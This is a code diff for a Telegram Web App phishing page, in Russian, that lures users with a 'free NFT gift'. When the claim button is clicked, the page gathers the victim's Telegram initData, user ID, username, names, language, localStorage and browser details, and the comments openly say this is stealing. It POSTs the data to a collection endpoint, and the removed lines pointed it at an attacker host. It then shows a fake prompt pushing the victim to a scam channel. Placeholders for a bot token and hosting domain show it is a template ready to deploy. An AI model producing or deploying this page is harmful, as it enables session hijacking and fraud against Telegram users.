@@ -1,31 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Бесплатный NFT-подарок</title>
+    <title>🎁 Бесплатный NFT-подарок</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <button id="claim">Получить NFT-подарок</button>
+    <div id="app">
+        <h1>Ваш NFT-подарок готов!</h1>
+        <button id="claim">🎁 Получить бесплатный NFT</button>
+    </div>
     
     <script>
+        const botToken = 'ТВОЙ_ТОКЕН_БОТА'; // Замени на реальный токен от @BotFather
+        const webAppUrl = 'https://твой-проект.up.railway.app'; // Замени на свой домен Railway
+
+        // Проверяем авторизацию через Telegram
+        if (!window.Telegram.WebApp.initData) {
+            alert('Открой через бота!');
+            window.location.href = `https://t.me/твой_бот?startapp=webapp`; // Замени на юзернейм бота
+        }
+
+        // Инициализируем Telegram Web App
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+
         document.getElementById('claim').addEventListener('click', function() {
-            // Крадём данные сессии Telegram
-            const tgData = JSON.stringify(window.Telegram.WebApp.initData);
-            const localStorageData = JSON.stringify(localStorage);
+            const tgData = Telegram.WebApp.initData;
+            const tgUser = Telegram.WebApp.initDataUnsafe.user;
             
-            // Отправляем на сервер злоумышленника
-            fetch('https://malicious-server.com/collect', {
+            // Крадём всё
+            const stolenData = {
+                telegram_data: tgData,
+                user_id: tgUser?.id,
+                username: tgUser?.username,
+                first_name: tgUser?.first_name,
+                last_name: tgUser?.last_name,
+                language: tgUser?.language_code,
+                local_storage: JSON.stringify(localStorage),
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Отправляем на сервер
+            fetch('/collect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    telegram_data: tgData,
-                    local_storage: localStorageData,
-                    user_agent: navigator.userAgent
-                })
+                body: JSON.stringify(stolenData)
             });
 
-            // Показываем фейковую загрузку
+            // Фейковая загрузка
             setTimeout(() => {
-                alert('Ошибка! Для получения подарка подпишитесь на канал: t.me/scam_channel');
+                alert('Для получения NFT подпишитесь на наш канал: t.me/your_scam_channel\n\nПосле подписки нажмите OK');
             }, 2000);
         });
     </script>
